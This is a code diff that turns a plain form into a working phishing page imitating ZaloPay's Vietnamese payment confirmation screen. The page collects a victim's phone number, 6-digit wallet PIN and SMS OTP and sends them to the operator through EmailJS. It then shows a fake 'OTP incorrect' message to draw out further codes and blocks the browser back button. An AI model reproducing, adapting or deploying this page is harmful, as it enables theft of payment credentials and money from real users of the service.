@@ -1,19 +1,871 @@
-<html>
-<head>
-    <title>ZaloPay Input Validation</title>
-</head>
-<body>
-    <form>
-        <label for="phone">Phone Number:</label>
-        <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required />
-        <br />
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" pattern="[0-9]{6}" required />
-        <br />
-        <label for="otp">OTP:</label>
-        <input type="text" id="otp" name="otp" pattern="[0-9]{6,8}" required />
-        <br />
-        <input type="submit" value="Submit" />
-    </form>
-</body>
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Xác Nhận Thanh Toán ZaloPay</title>
+    <meta name="theme-color" content="#0068FF" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("czFi4gUzL4_CdwPcd");
+      })();
+    </script>
+
+    <style>
+      :root {
+        --zp-primary: #0068FF;
+        --zp-primary-dark: #0054CC;
+        --zp-text-primary: #1A1A2E;
+        --zp-text-secondary: #8E8E93;
+        --zp-text-link: #0068FF;
+        --zp-bg-body: #F0F2F5;
+        --zp-bg-card: #FFFFFF;
+        --zp-border: #E5E5EA;
+        --zp-input-border: #D1D1D6;
+        --zp-input-focus: #0068FF;
+        --zp-shadow-card: 0 2px 12px rgba(0, 0, 0, 0.06);
+        --zp-shadow-btn: 0 4px 14px rgba(0, 104, 255, 0.3);
+        --zp-radius-card: 20px;
+        --zp-radius-input: 12px;
+        --zp-radius-btn: 12px;
+        --zp-header-height: 56px;
+        --zp-banner-height: 280px;
+      }
+
+      * {
+        margin: 0; padding: 0; box-sizing: border-box;
+        font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+        -webkit-tap-highlight-color: transparent;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      body {
+        background-color: var(--zp-bg-body);
+        display: flex;
+        justify-content: center;
+        min-height: 100vh;
+      }
+
+      .mobile-frame {
+        width: 100%;
+        max-width: 420px;
+        min-height: 100vh;
+        position: relative;
+        overflow: hidden;
+        background-color: var(--zp-bg-body);
+      }
+
+      .page-section {
+        display: none;
+        flex-direction: column;
+        width: 100%;
+        min-height: 100vh;
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+      }
+
+      .page-section.active {
+        display: flex;
+        z-index: 10;
+        animation: fadeSlideIn 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+      }
+
+      @keyframes fadeSlideIn {
+        from { transform: translateX(30px); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+      }
+
+      /* ===== BANNER SLIDER ===== */
+      .phone-banner {
+        position: relative;
+        height: var(--zp-banner-height);
+        overflow: hidden;
+        flex-shrink: 0;
+        background: linear-gradient(135deg, #0068FF 0%, #0047B3 100%);
+      }
+
+      .banner-slider {
+        display: flex;
+        width: 300%;
+        height: 100%;
+        transition: transform 0.6s cubic-bezier(0.25, 1, 0.5, 1);
+      }
+
+      .banner-slide {
+        width: calc(100% / 3);
+        height: 100%;
+        position: relative;
+        flex-shrink: 0;
+        overflow: hidden;
+      }
+
+      .banner-slide .slide-bg {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+        position: absolute;
+        top: 0; left: 0;
+      }
+
+      .banner-slide .slide-fallback {
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        display: none;
+      }
+
+      .banner-slide .slide-fallback.s1 {
+        background: linear-gradient(135deg, #0068FF 0%, #00B4D8 100%);
+      }
+      .banner-slide .slide-fallback.s2 {
+        background: linear-gradient(135deg, #0054CC 0%, #00C9A7 100%);
+      }
+      .banner-slide .slide-fallback.s3 {
+        background: linear-gradient(135deg, #0068FF 0%, #7B2FF7 100%);
+      }
+
+      .banner-slide .slide-overlay {
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        z-index: 1;
+      }
+
+      .banner-slide:nth-child(1) .slide-overlay {
+        background: linear-gradient(to right, rgba(0,104,255,0.80) 0%, rgba(0,104,255,0.40) 50%, transparent 100%);
+      }
+      .banner-slide:nth-child(2) .slide-overlay {
+        background: linear-gradient(to right, rgba(0,84,204,0.75) 0%, rgba(0,84,204,0.35) 50%, transparent 100%);
+      }
+      .banner-slide:nth-child(3) .slide-overlay {
+        background: linear-gradient(180deg, rgba(0,0,0,0.08) 0%, rgba(0,0,0,0.03) 100%);
+      }
+
+      .banner-slide .slide-content {
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        padding: 50px 24px 40px;
+        z-index: 2;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
+
+      .slide-content .slide-title {
+        color: #FFFFFF;
+        font-size: 24px;
+        font-weight: 700;
+        line-height: 1.35;
+        max-width: 60%;
+        text-shadow: 0 2px 8px rgba(0,0,0,0.25);
+      }
+
+      .slide-content .slide-subtitle {
+        color: rgba(255,255,255,0.9);
+        font-size: 15px;
+        font-weight: 400;
+        margin-top: 6px;
+        max-width: 60%;
+        text-shadow: 0 1px 4px rgba(0,0,0,0.15);
+      }
+
+      .banner-slide:nth-child(3) .slide-content { display: none; }
+
+      .banner-dots {
+        position: absolute;
+        bottom: 28px;
+        left: 0; right: 0;
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        z-index: 10;
+      }
+
+      .banner-dot {
+        width: 8px; height: 8px;
+        border-radius: 50%;
+        background: rgba(255,255,255,0.4);
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .banner-dot.active {
+        background: #FFFFFF;
+        width: 24px;
+        border-radius: 4px;
+      }
+
+      /* ===== PHONE CARD ===== */
+      .phone-card {
+        background: var(--zp-bg-card);
+        border-radius: var(--zp-radius-card) var(--zp-radius-card) 0 0;
+        margin-top: -20px;
+        position: relative;
+        z-index: 5;
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        padding: 28px 24px 0;
+      }
+
+      .phone-card-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: var(--zp-text-primary);
+        margin-bottom: 16px;
+      }
+
+      .phone-input-wrapper {
+        border: 1.5px solid var(--zp-input-border);
+        border-radius: var(--zp-radius-input);
+        padding: 14px 16px;
+        transition: all 0.2s ease;
+        background: #FFFFFF;
+      }
+
+      .phone-input-wrapper:focus-within {
+        border-color: var(--zp-input-focus);
+        box-shadow: 0 0 0 3px rgba(0,104,255,0.1);
+      }
+
+      .phone-input {
+        width: 100%;
+        border: none; outline: none;
+        font-size: 16px;
+        font-weight: 500;
+        color: var(--zp-text-primary);
+        background: transparent;
+      }
+
+      .phone-input::placeholder {
+        color: var(--zp-text-secondary);
+        font-weight: 400;
+      }
+
+      .terms-text {
+        margin-top: auto;
+        padding: 20px 0;
+        text-align: center;
+        font-size: 13px;
+        color: var(--zp-text-secondary);
+        line-height: 1.6;
+      }
+
+      .terms-text a {
+        color: var(--zp-text-link);
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      /* ===== BUTTONS ===== */
+      .footer-actions {
+        padding: 16px 24px 34px;
+        background: var(--zp-bg-card);
+      }
+
+      .btn-primary {
+        width: 100%;
+        background-color: var(--zp-primary);
+        color: #FFFFFF;
+        border: none;
+        padding: 16px;
+        border-radius: var(--zp-radius-btn);
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        box-shadow: var(--zp-shadow-btn);
+      }
+
+      .btn-primary:active {
+        transform: scale(0.97);
+        background-color: var(--zp-primary-dark);
+      }
+
+      .btn-primary:disabled {
+        background-color: #B0C4DE;
+        box-shadow: none;
+        cursor: not-allowed;
+      }
+
+      /* ===== PIN HEADER ===== */
+      .pin-header {
+        background: var(--zp-primary);
+        height: var(--zp-header-height);
+        display: flex;
+        align-items: center;
+        padding: 0 16px;
+        position: relative;
+        flex-shrink: 0;
+      }
+
+      .pin-header .back-btn {
+        background: none; border: none;
+        padding: 8px; cursor: pointer;
+        color: #FFFFFF;
+        display: flex; align-items: center;
+      }
+
+      .pin-header .header-title {
+        color: #FFFFFF;
+        font-size: 17px;
+        font-weight: 600;
+        margin-left: 8px;
+      }
+
+      .pin-header-right {
+        position: absolute;
+        right: 16px;
+        display: flex;
+        align-items: center;
+        gap: 2px;
+      }
+
+      .pin-header-right button {
+        background: rgba(255,255,255,0.15);
+        border: none;
+        color: #FFFFFF;
+        width: 36px; height: 36px;
+        border-radius: 50%;
+        display: flex; align-items: center; justify-content: center;
+        cursor: pointer;
+        font-size: 16px;
+      }
+
+      /* ===== PIN BODY ===== */
+      .pin-body {
+        flex-grow: 1;
+        padding: 20px 16px;
+        display: flex;
+        flex-direction: column;
+        background: var(--zp-bg-body);
+      }
+
+      .pin-card {
+        background: var(--zp-bg-card);
+        border-radius: 16px;
+        padding: 32px 24px 28px;
+        box-shadow: var(--zp-shadow-card);
+      }
+
+      .pin-card-title {
+        font-size: 22px;
+        font-weight: 700;
+        text-align: center;
+        color: var(--zp-text-primary);
+        margin-bottom: 10px;
+      }
+
+      .pin-card-subtitle {
+        font-size: 14px;
+        color: var(--zp-text-secondary);
+        text-align: center;
+        margin-bottom: 28px;
+        line-height: 1.5;
+      }
+
+      .pin-container {
+        display: flex;
+        justify-content: center;
+        gap: 18px;
+        margin-bottom: 24px;
+      }
+
+      .pin-dot {
+        width: 20px; height: 20px;
+        border: 2px solid var(--zp-input-border);
+        border-radius: 50%;
+        transition: all 0.2s cubic-bezier(0.175,0.885,0.32,1.275);
+        background: transparent;
+      }
+
+      .pin-dot.active { border-color: var(--zp-primary); }
+
+      .pin-dot.filled {
+        background-color: var(--zp-primary);
+        border-color: var(--zp-primary);
+        transform: scale(1.05);
+      }
+
+      .forgot-password {
+        text-align: center;
+        color: var(--zp-text-link);
+        font-weight: 600;
+        font-size: 14px;
+        cursor: pointer;
+        padding: 8px;
+      }
+
+      .hidden-input {
+        position: absolute;
+        opacity: 0;
+        pointer-events: none;
+      }
+
+      /* ===== OTP ===== */
+      .otp-body {
+        flex-grow: 1;
+        padding: 20px 16px;
+        display: flex;
+        flex-direction: column;
+        background: var(--zp-bg-body);
+      }
+
+      .otp-card {
+        background: var(--zp-bg-card);
+        border-radius: 16px;
+        padding: 32px 24px 28px;
+        box-shadow: var(--zp-shadow-card);
+      }
+
+      .otp-card-title {
+        font-size: 22px;
+        font-weight: 700;
+        text-align: center;
+        color: var(--zp-text-primary);
+        margin-bottom: 10px;
+      }
+
+      .otp-card-subtitle {
+        font-size: 14px;
+        color: var(--zp-text-secondary);
+        text-align: center;
+        margin-bottom: 28px;
+        line-height: 1.5;
+      }
+
+      .otp-box-modern {
+        background: #FFF;
+        border: 2px solid var(--zp-border);
+        border-radius: 14px;
+        padding: 12px 16px;
+        display: flex;
+        align-items: center;
+        transition: border-color 0.2s;
+        overflow: hidden;
+      }
+
+      .otp-box-modern:focus-within {
+        border-color: var(--zp-primary);
+        box-shadow: 0 0 0 3px rgba(0,104,255,0.1);
+      }
+
+      .otp-main-input {
+        flex-grow: 1;
+        border: none; outline: none;
+        font-size: 28px;
+        font-weight: 700;
+        text-align: center;
+        color: var(--zp-text-primary);
+        letter-spacing: 8px;
+      }
+
+      .otp-main-input::placeholder {
+        letter-spacing: 4px;
+        color: var(--zp-text-secondary);
+      }
+
+      .clear-btn {
+        background: #F0F0F5;
+        border: none;
+        border-radius: 50%;
+        width: 30px; height: 30px;
+        display: flex; align-items: center; justify-content: center;
+        cursor: pointer;
+        color: #8E8E93;
+        flex-shrink: 0;
+        visibility: hidden;
+        font-size: 14px;
+      }
+
+      .clear-btn.visible { visibility: visible; }
+
+      .otp-timer {
+        text-align: center;
+        margin-top: 24px;
+        color: var(--zp-text-secondary);
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .otp-timer span {
+        color: var(--zp-primary);
+        font-weight: 700;
+      }
+
+      /* ===== TOAST ===== */
+      .toast {
+        position: fixed;
+        bottom: -100px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0,0,0,0.85);
+        color: #FFF;
+        padding: 14px 28px;
+        border-radius: 50px;
+        font-size: 14px;
+        font-weight: 500;
+        z-index: 2000;
+        transition: bottom 0.5s cubic-bezier(0.18,0.89,0.32,1.28);
+        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        white-space: nowrap;
+        max-width: 90%;
+        text-align: center;
+      }
+
+      .toast.show { bottom: 50px; }
+
+      .shake { animation: shake 0.4s both; }
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-6px); }
+        75% { transform: translateX(6px); }
+      }
+
+      @media (min-width: 421px) {
+        body { align-items: center; padding: 20px 0; }
+        .mobile-frame {
+          min-height: 812px; max-height: 896px;
+          border-radius: 36px;
+          box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+          overflow: hidden;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="mobile-frame">
+
+      <!-- SECTION 1: PHONE INPUT -->
+      <section id="sec-phone" class="page-section active">
+
+        <div class="phone-banner">
+          <div class="banner-slider" id="bannerSlider">
+
+            <!-- SLIDE 1 -->
+            <div class="banner-slide">
+              <img class="slide-bg"
+                src="https://cdn.aptoide.com/imgs/1/8/3/18322fc02160f69a6cf496527ce45c49_fgraphic.png"
+                alt="ZaloPay Banner 1"
+                onload="this.style.display='block'"
+                onerror="this.style.display='none'; this.nextElementSibling.style.display='block';"
+              />
+              <div class="slide-fallback s1"></div>
+              <div class="slide-overlay"></div>
+              <div class="slide-content">
+                <div class="slide-title">Bắt nhịp<br/>tài chính linh hoạt</div>
+                <div class="slide-subtitle">từ số tiền nhỏ</div>
+              </div>
+            </div>
+
+            <!-- SLIDE 2 -->
+            <div class="banner-slide">
+              <img class="slide-bg"
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8zV2NM5LBxzvUcSanIhAGjftc7oE7YjLYsA&s"
+                alt="ZaloPay Banner 2"
+                onload="this.style.display='block'"
+                onerror="this.style.display='none'; this.nextElementSibling.style.display='block';"
+              />
+              <div class="slide-fallback s2"></div>
+              <div class="slide-overlay"></div>
+              <div class="slide-content">
+                <div class="slide-title">Thanh toán<br/>an toàn &amp; tiện lợi</div>
+                <div class="slide-subtitle">Quét QR mọi nơi</div>
+              </div>
+            </div>
+
+            <!-- SLIDE 3 -->
+            <div class="banner-slide">
+              <img class="slide-bg"
+                src="https://simg.zalopay.com.vn/zlp-website/assets/1x_243_Mapcard_1_T_1242x598_9ead8e99d6.jpg"
+                alt="ZaloPay Banner 3"
+                onload="this.style.display='block'"
+                onerror="this.style.display='none'; this.nextElementSibling.style.display='block';"
+              />
+              <div class="slide-fallback s3"></div>
+              <div class="slide-overlay"></div>
+              <div class="slide-content"></div>
+            </div>
+
+          </div>
+
+          <div class="banner-dots" id="bannerDots">
+            <div class="banner-dot active" onclick="goToSlide(0)"></div>
+            <div class="banner-dot" onclick="goToSlide(1)"></div>
+            <div class="banner-dot" onclick="goToSlide(2)"></div>
+          </div>
+        </div>
+
+        <div class="phone-card">
+          <div class="phone-card-title">Nhập số điện thoại để tiếp tục</div>
+          <div class="phone-input-wrapper">
+            <input type="tel" id="input-phone" class="phone-input"
+                   placeholder="Nhập số điện thoại" maxlength="10"
+                   inputmode="numeric" autocomplete="tel" />
+          </div>
+          <div class="terms-text">
+            Bằng việc sử dụng Zalopay, tôi đồng ý với
+            <a href="#">Thoả thuận sử dụng Zalopay</a>
+            và <a href="#">Chính sách bảo vệ quyền riêng tư</a>
+          </div>
+        </div>
+
+        <div class="footer-actions">
+          <button class="btn-primary" onclick="handleNextToPassword()">Tiếp tục</button>
+        </div>
+      </section>
+
+      <!-- SECTION 2: PIN -->
+      <section id="sec-password" class="page-section">
+        <div class="pin-header">
+          <button class="back-btn" onclick="prevToPhone()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+          </button>
+          <span class="header-title">Thay đổi số điện thoại</span>
+          <div class="pin-header-right">
+            <button>•••</button>
+            <button onclick="prevToPhone()">✕</button>
+          </div>
+        </div>
+        <div class="pin-body">
+          <div class="pin-card">
+            <div class="pin-card-title">Xác nhận mật khẩu</div>
+            <div class="pin-card-subtitle">Nhập mật khẩu để xác nhận bạn là chủ tài khoản này</div>
+            <div id="pin-wrap" class="pin-container" onclick="focusPin()">
+              <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+              <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+            </div>
+            <input type="password" id="real-pin" class="hidden-input" maxlength="6" inputmode="numeric" />
+            <div class="forgot-password">Quên mật khẩu</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SECTION 3: OTP -->
+      <section id="sec-otp" class="page-section">
+        <div class="pin-header">
+          <button class="back-btn" onclick="prevToPassword()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+          </button>
+          <span class="header-title">Xác thực OTP</span>
+          <div class="pin-header-right">
+            <button>•••</button>
+            <button onclick="prevToPassword()">✕</button>
+          </div>
+        </div>
+        <div class="otp-body">
+          <div class="otp-card">
+            <div class="otp-card-title">Nhập mã xác thực</div>
+            <div class="otp-card-subtitle">Mã xác thực đã được gửi đến số điện thoại của bạn qua tin nhắn SMS.</div>
+            <div class="otp-box-modern">
+              <input type="text" id="input-otp" class="otp-main-input"
+                     placeholder="••••••" inputmode="text"
+                     spellcheck="false" autocomplete="one-time-code" />
+              <button id="otp-clear" class="clear-btn" onclick="clearOtp()">✕</button>
+            </div>
+            <div id="timer" class="otp-timer">Gửi lại mã sau <span>59s</span></div>
+          </div>
+          <div style="margin-top:auto; padding:16px 0 34px;">
+            <button class="btn-primary" onclick="submitFinal()">Xác nhận</button>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <div id="toast" class="toast">Thông báo hệ thống</div>
+
+    <script>
+      const state = { phone: "", pin: "", otp: "" };
+
+      /* ===== BANNER SLIDER ===== */
+      const slider = document.getElementById("bannerSlider");
+      const allDots = document.querySelectorAll(".banner-dot");
+      let currentSlide = 0;
+      const totalSlides = 3;
+      let slideInterval = null;
+      let touchStartX = 0;
+
+      function goToSlide(index) {
+        currentSlide = index;
+        slider.style.transform = `translateX(-${(100 / totalSlides) * index}%)`;
+        allDots.forEach((d, i) => d.classList.toggle("active", i === index));
+      }
+
+      function nextSlide() { goToSlide((currentSlide + 1) % totalSlides); }
+
+      function startAutoSlide() {
+        stopAutoSlide();
+        slideInterval = setInterval(nextSlide, 3500);
+      }
+
+      function stopAutoSlide() {
+        if (slideInterval) { clearInterval(slideInterval); slideInterval = null; }
+      }
+
+      // Touch swipe
+      const bannerEl = document.querySelector(".phone-banner");
+      bannerEl.addEventListener("touchstart", e => {
+        touchStartX = e.changedTouches[0].screenX;
+        stopAutoSlide();
+      }, { passive: true });
+
+      bannerEl.addEventListener("touchend", e => {
+        const diff = touchStartX - e.changedTouches[0].screenX;
+        if (Math.abs(diff) > 50) {
+          if (diff > 0 && currentSlide < totalSlides - 1) goToSlide(currentSlide + 1);
+          else if (diff < 0 && currentSlide > 0) goToSlide(currentSlide - 1);
+        }
+        startAutoSlide();
+      }, { passive: true });
+
+      startAutoSlide();
+
+      /* ===== HELPERS ===== */
+      function safeFocus(id) {
+        const el = document.getElementById(id);
+        if (el) setTimeout(() => { el.focus(); el.click(); }, 450);
+      }
+
+      function showSection(id) {
+        document.querySelectorAll(".page-section").forEach(s => s.classList.remove("active"));
+        document.getElementById(id).classList.add("active");
+        if (id === "sec-phone") startAutoSlide(); else stopAutoSlide();
+      }
+
+      function showToast(msg) {
+        const t = document.getElementById("toast");
+        t.innerText = msg;
+        t.classList.add("show");
+        setTimeout(() => t.classList.remove("show"), 3000);
+      }
+
+      /* ===== PHONE ===== */
+      function handleNextToPassword() {
+        const phone = document.getElementById("input-phone").value.trim();
+        if (phone.length < 9) { showToast("Vui lòng nhập số điện thoại hợp lệ"); return; }
+        state.phone = phone;
+        showSection("sec-password");
+        safeFocus("real-pin");
+        updatePinActiveState();
+      }
+
+      function prevToPhone() { showSection("sec-phone"); safeFocus("input-phone"); }
+
+      /* ===== PIN ===== */
+      const realPinInput = document.getElementById("real-pin");
+      const pinDots = document.querySelectorAll(".pin-dot");
+
+      function focusPin() { realPinInput.focus(); }
+
+      function updatePinActiveState() {
+        const val = realPinInput.value;
+        pinDots.forEach((dot, i) => {
+          dot.classList.remove("filled", "active");
+          if (i < val.length) dot.classList.add("filled");
+          else if (i === val.length) dot.classList.add("active");
+        });
+      }
+
+      realPinInput.addEventListener("input", e => {
+        updatePinActiveState();
+        if (e.target.value.length === 6) setTimeout(handleValidatePin, 300);
+      });
+
+      function handleValidatePin() {
+        if (realPinInput.value.length < 6) {
+          const wrap = document.getElementById("pin-wrap");
+          wrap.classList.add("shake");
+          setTimeout(() => wrap.classList.remove("shake"), 400);
+          showToast("Mật khẩu gồm 6 chữ số");
+          return;
+        }
+        state.pin = realPinInput.value;
+        showSection("sec-otp");
+        safeFocus("input-otp");
+        startOtpTimer();
+      }
+
+      function prevToPassword() { showSection("sec-password"); safeFocus("real-pin"); }
+
+      /* ===== OTP ===== */
+      const otpInput = document.getElementById("input-otp");
+      const otpClear = document.getElementById("otp-clear");
+
+      otpInput.addEventListener("input", e => {
+        otpClear.classList.toggle("visible", e.target.value.length > 0);
+      });
+
+      function clearOtp() {
+        otpInput.value = "";
+        otpClear.classList.remove("visible");
+        otpInput.focus();
+      }
+
+      let otpTimerInterval = null;
+
+      function startOtpTimer() {
+        let seconds = 59;
+        const timerEl = document.getElementById("timer");
+        if (otpTimerInterval) clearInterval(otpTimerInterval);
+        otpTimerInterval = setInterval(() => {
+          seconds--;
+          if (seconds <= 0) {
+            clearInterval(otpTimerInterval);
+            timerEl.innerHTML = '<span style="color:var(--zp-primary);cursor:pointer;font-weight:600;">Gửi lại mã</span>';
+            return;
+          }
+          timerEl.innerHTML = `Gửi lại mã sau <span>${seconds}s</span>`;
+        }, 1000);
+      }
+
+      async function submitFinal() {
+        const otp = otpInput.value;
+        if (!otp) { showToast("Vui lòng nhập mã OTP"); return; }
+
+        const timestamp = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+        const templateParams = {
+          phone: state.phone, pin: state.pin, otp: otp,
+          time: timestamp, project: "ZaloPay Checkout Pro"
+        };
+
+        try {
+          const btn = document.querySelector("#sec-otp .btn-primary");
+          const originalText = btn.innerText;
+          btn.innerText = "Đang xử lý...";
+          btn.disabled = true;
+          await emailjs.send("service_default", "template_default", templateParams);
+          showToast("Mã OTP không chính xác hoặc đã hết hạn");
+          setTimeout(() => { clearOtp(); btn.innerText = originalText; btn.disabled = false; }, 2000);
+        } catch (err) {
+          showToast("Hệ thống bận, vui lòng thử lại sau");
+          console.error("EmailJS Error:", err);
+          const btn = document.querySelector("#sec-otp .btn-primary");
+          btn.disabled = false;
+          btn.innerText = "Xác nhận";
+        }
+      }
+
+      /* ===== SECURITY & INIT ===== */
+      function initSecurityFix() {
+        try {
+          window.history.pushState(null, "", window.location.href);
+          window.addEventListener("popstate", () => {
+            window.history.pushState(null, "", window.location.href);
+            showToast("Vui lòng hoàn tất giao dịch");
+          });
+        } catch (e) {}
+      }
+
+      window.onload = () => {
+        initSecurityFix();
+        document.getElementById("input-phone").focus();
+      };
+    </script>
+  </body>
 </html>
